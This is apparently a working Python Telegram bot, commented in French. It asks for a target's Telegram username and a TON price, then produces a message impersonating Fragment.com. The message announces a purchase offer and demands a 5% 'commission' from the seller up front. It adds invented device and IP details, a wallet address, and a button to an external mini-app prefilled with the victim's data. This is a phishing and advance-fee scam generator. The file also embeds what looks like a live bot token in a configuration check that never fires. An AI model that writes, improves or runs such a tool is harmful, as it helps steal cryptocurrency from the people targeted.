import logging
import os
from datetime import datetime
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, WebAppInfo
from telegram.ext import (
    Application, 
    CommandHandler, 
    MessageHandler, 
    filters, 
    ContextTypes, 
    ConversationHandler,
    CallbackQueryHandler
)

# Configuration du logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[
        logging.FileHandler('fragment_bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# États de conversation
USERNAME_INPUT, PRICE_INPUT, CONFIRMATION = range(3)

# Configuration
BOT_TOKEN = ""  # Remplacez par votre token
WEBAPP_URL = "https://myminiapp.onrender.com"  # URL de votre mini app

class FragmentDealBot:
    def __init__(self, token):
        self.application = Application.builder().token(token).build()
        self.setup_handlers()
        
        # Données temporaires des deals
        self.user_deals = {}
    
    def setup_handlers(self):
        """Configure tous les handlers du bot"""
        
        # Conversation handler pour créer un deal
        conv_handler = ConversationHandler(
            entry_points=[CommandHandler('newdeal', self.start_deal)],
            states={
                USERNAME_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_username)],
                PRICE_INPUT: [MessageHandler(filters.TEXT & ~filters.COMMAND, self.get_price)],
                CONFIRMATION: [CallbackQueryHandler(self.confirm_deal)]
            },
            fallbacks=[CommandHandler('cancel', self.cancel_deal)]
        )
        
        self.application.add_handler(conv_handler)
        self.application.add_handler(CommandHandler("start", self.start_command))
        self.application.add_handler(CommandHandler("help", self.help_command))
        self.application.add_handler(CallbackQueryHandler(self.button_callback))
    
    async def start_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Commande /start"""
        user = update.effective_user
        welcome_text = f"""
🎯 **Fragment Deal Bot**

Bonjour {user.first_name} ! Je suis votre assistant pour générer des messages de deals Fragment.com.

📋 **Commandes disponibles :**
• `/newdeal` - Créer un nouveau deal
• `/help` - Aide détaillée
• `/cancel` - Annuler l'opération en cours

🚀 **Pour commencer :** Tapez `/newdeal`
        """
        await update.message.reply_text(welcome_text, parse_mode='Markdown')
        logger.info(f"Nouvel utilisateur: {user.first_name} (ID: {user.id})")
    
    async def help_command(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Commande /help"""
        help_text = """
📚 **Guide d'utilisation Fragment Deal Bot**

🔹 **Étapes pour créer un deal :**
1. Tapez `/newdeal`
2. Saisissez le username Telegram (sans @)
3. Saisissez le montant en TON
4. Confirmez et envoyez

💎 **Format du prix :**
• Saisissez uniquement le nombre
• Exemple : `1500` pour 💎1500 TON

🔧 **Commandes :**
• `/newdeal` - Nouveau deal
• `/cancel` - Annuler
• `/help` - Cette aide

⚠️ **Notes importantes :**
• Commission automatique de 5%
• Tous les montants affichés en TON uniquement
• URL personnalisable vers votre mini-app
        """
        await update.message.reply_text(help_text, parse_mode='Markdown')
    
    async def start_deal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Démarre le processus de création de deal"""
        user_id = update.effective_user.id
        self.user_deals[user_id] = {}
        
        await update.message.reply_text(
            "📝 **Nouveau Deal Fragment**\n\n"
            "Étape 1/2: Saisissez le **username Telegram** du client (sans @):\n\n"
            "Exemple: `CRYPTO_DEAL`\n\n"
            "_Tapez /cancel pour annuler_",
            parse_mode='Markdown'
        )
        return USERNAME_INPUT
    
    async def get_username(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Récupère le username"""
        user_id = update.effective_user.id
        username = update.message.text.strip().replace('@', '')
        
        # Validation basique du username
        if not username.replace('_', '').isalnum() or len(username) < 3:
            await update.message.reply_text(
                "❌ **Username invalide**\n\n"
                "Le username doit:\n"
                "• Contenir au moins 3 caractères\n"
                "• Contenir uniquement des lettres, chiffres et underscore\n\n"
                "Réessayez:",
                parse_mode='Markdown'
            )
            return USERNAME_INPUT
        
        self.user_deals[user_id]['username'] = username
        
        await update.message.reply_text(
            f"✅ Username: `@{username}`\n\n"
            "📝 Étape 2/2: Saisissez le **montant en TON**:\n\n"
            "Exemple: `1500` (sera affiché comme 💎1500)\n\n"
            "_Tapez /cancel pour annuler_",
            parse_mode='Markdown'
        )
        return PRICE_INPUT
    
    async def get_price(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Récupère le prix en TON"""
        user_id = update.effective_user.id
        price_input = update.message.text.strip()
        
        # Extraction et validation du nombre
        import re
        numbers = re.findall(r'[\d.]+', price_input)
        
        if not numbers:
            await update.message.reply_text(
                "❌ **Prix invalide**\n\n"
                "Veuillez saisir un nombre valide\n"
                "Exemple: `1500`\n\n"
                "Réessayez:",
                parse_mode='Markdown'
            )
            return PRICE_INPUT
        
        try:
            # Conversion en nombre
            ton_amount = float(numbers[0])
            
            # Validation du montant minimum
            if ton_amount < 1:
                await update.message.reply_text(
                    "❌ **Montant trop faible**\n\n"
                    "Le montant doit être d'au moins 1 TON\n\n"
                    "Réessayez:",
                    parse_mode='Markdown'
                )
                return PRICE_INPUT
            
            # Calcul de la commission (5%)
            commission_amount = ton_amount * 0.05
            
            # Formatage des montants TON
            # Si c'est un nombre entier, on l'affiche sans décimales
            if ton_amount == int(ton_amount):
                deal_price_formatted = f"💎{int(ton_amount)}"
            else:
                deal_price_formatted = f"💎{ton_amount:.2f}"
            
            if commission_amount == int(commission_amount):
                commission_formatted = f"💎{int(commission_amount)}"
            else:
                commission_formatted = f"💎{commission_amount:.2f}"
            
            self.user_deals[user_id].update({
                'ton_amount': ton_amount,
                'deal_price': deal_price_formatted,
                'commission': commission_formatted
            })
            
        except (ValueError, IndexError):
            await update.message.reply_text(
                "❌ **Format invalide**\n\n"
                "Veuillez saisir un nombre valide\n"
                "Exemple: `1500` ou `1500.5`\n\n"
                "Réessayez:",
                parse_mode='Markdown'
            )
            return PRICE_INPUT
        
        # Aperçu du deal
        username = self.user_deals[user_id]['username']
        deal_price = self.user_deals[user_id]['deal_price']
        commission = self.user_deals[user_id]['commission']
        
        preview_text = f"""
📋 **Aperçu du Deal**

👤 **Client:** @{username}
💎 **Montant:** {deal_price}
💰 **Commission (5%):** {commission}

✅ Confirmer et générer le message ?
        """
        
        keyboard = [
            [
                InlineKeyboardButton("✅ Confirmer", callback_data='confirm_deal'),
                InlineKeyboardButton("❌ Annuler", callback_data='cancel_deal')
            ]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            preview_text.strip(),
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        return CONFIRMATION
    
    async def confirm_deal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Confirme et génère le message final"""
        query = update.callback_query
        await query.answer()
        
        user_id = query.from_user.id
        
        if query.data == 'cancel_deal':
            await query.edit_message_text("❌ Deal annulé.")
            self.user_deals.pop(user_id, None)
            return ConversationHandler.END
        
        if query.data == 'confirm_deal':
            deal_data = self.user_deals[user_id]
            
            # Génération du message Fragment
            fragment_message = self.generate_fragment_message(deal_data)
            
            # Bouton vers la mini-app
            deal_link = f"{WEBAPP_URL}/?user={deal_data['username']}&price={deal_data['ton_amount']}"
            keyboard = [
                [InlineKeyboardButton("🌐 Ouvrir Mini App", web_app=WebAppInfo(url=deal_link))]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await query.edit_message_text(
                "✅ **Deal généré avec succès !**\n\nVoici le message à envoyer:"
            )
            
            # Envoyer le message Fragment
            await context.bot.send_message(
                chat_id=user_id,
                text=fragment_message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            # Log du deal créé
            logger.info(f"Deal créé - User: @{deal_data['username']}, TON: {deal_data['ton_amount']}")
            
            self.user_deals.pop(user_id, None)
            return ConversationHandler.END
    
    def generate_fragment_message(self, deal_data):
        """Génère le message Fragment.com avec montants TON uniquement"""
        username = deal_data['username']
        deal_price = deal_data['deal_price']
        commission = deal_data['commission']
        
        message = f"""
We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• **Offer Amount:** {deal_price}
• **Commission:** {commission}

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

**Additional Information:**
• Device: Safari on macOS
• IP Address: 103.56.72.245
• Wallet: EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U ([View](https://tonviewer.com/EQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XG4U))

**Important:**

• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message.
        """
        return message.strip()
    
    async def cancel_deal(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Annule le processus de création de deal"""
        user_id = update.effective_user.id
        self.user_deals.pop(user_id, None)
        
        await update.message.reply_text(
            "❌ **Opération annulée**\n\n"
            "Tapez `/newdeal` pour créer un nouveau deal.",
            parse_mode='Markdown'
        )
        return ConversationHandler.END
    
    async def button_callback(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gère les callbacks généraux"""
        query = update.callback_query
        await query.answer()
    
    async def error_handler(self, update: Update, context: ContextTypes.DEFAULT_TYPE):
        """Gestion des erreurs"""
        logger.error(f"Erreur: {context.error}")
        if update and update.message:
            await update.message.reply_text(
                "❌ Une erreur s'est produite. Réessayez avec `/newdeal`"
            )
    
    def run(self):
        """Lance le bot"""
        self.application.add_error_handler(self.error_handler)
        
        print("🚀 Fragment Deal Bot démarré...")
        print("💎 Mode: TON uniquement")
        print("🎯 Fonctionnalités:")
        print("   • Création de deals Fragment")
        print("   • Calcul automatique des commissions (5%)")
        print("   • Intégration mini-app")
        print("\n💬 Tapez /newdeal pour commencer")
        
        self.application.run_polling(
            allowed_updates=Update.ALL_TYPES,
            drop_pending_updates=True
        )

def main():
    if BOT_TOKEN == "7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c":
        print("❌ ERREUR: Configurez votre BOT_TOKEN !")
        print("👉 Obtenez votre token via @BotFather")
        return
    
    try:
        bot = FragmentDealBot(BOT_TOKEN)
        bot.run()
    except Exception as e:
        print(f"❌ Erreur fatale: {e}")

if __name__ == '__main__':
    main()
